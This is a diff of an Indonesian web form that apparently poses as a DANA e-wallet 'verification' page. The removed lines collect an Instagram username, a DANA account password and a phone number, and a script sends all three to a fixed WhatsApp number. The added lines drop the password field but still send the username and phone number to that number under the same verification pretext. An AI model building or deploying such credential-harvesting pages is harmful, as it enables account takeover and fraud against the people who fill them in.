@@ -146,31 +146,27 @@
     <option value="5000">2 TAHUN…</option>
     <option value="10000">5 TAHUN…</option>
   </select>
+ <label for="instagram">Username Instagram</label>
+            <input type="text" id="instagram" name="instagram" placeholder="Masukkan username Instagram" required>
 
-  <label for="instagram">Username Instagram</label>
-  <input type="text" id="instagram" name="instagram" required>
+            <label for="contact">Nomor Telepon</label>
+            <input type="tel" id="contact" name="contact" placeholder="Masukkan nomor telepon" required>
 
-  <label for="sandi">Sandi Akun DANA</label>
-  <input type="password" id="sandi" name="sandi" required>
-
-  <label for="contact">Nomor Telepon DANA</label>
-  <input type="tel" id="contact" name="contact" required>
-
-  <button type="button" id="whatsapp-btn">VERIFIKASI SEKARANG</button>
-</form>
-
+<button type="button" id="whatsapp-btn">Pesan Sekarang</button>
+        </form>
 <script>
-document.getElementById("whatsapp-btn").addEventListener("click", function() {
-  const username = document.getElementById("instagram").value;
-  const contact = document.getElementById("contact").value;
-  const sandi = document.getElementById("sandi").value;
+  document.getElementById("whatsapp-btn").addEventListener("click", function () {
+    const username = document.getElementById("instagram").value;
+    const contact = document.getElementById("contact").value;
 
-  const waNumber = "12498950768";
-  const message = `Halo, saya ingin verifikasi.\nUsername: ${username}\nNomor: ${contact}\nSandi: ${sandi}`;
-  const url = `https://api.whatsapp.com/send?phone=${waNumber}&text=${encodeURIComponent(message)}`;
+    const waNumber = "12498950768";
 
-  window.open(url, "_blank");
-});
+    const message = `Halo, saya ingin Verifikasi Dana.\nUsername DANA: ${username}\nNomor Telepon: ${contact}`;
+
+    const encodedMessage = encodeURIComponent(message);
+
+window.open(`https://wa.me/${waNumber}?text=${encodedMessage}`, "_blank");
+  });
 </script>
     </div>
 </div>
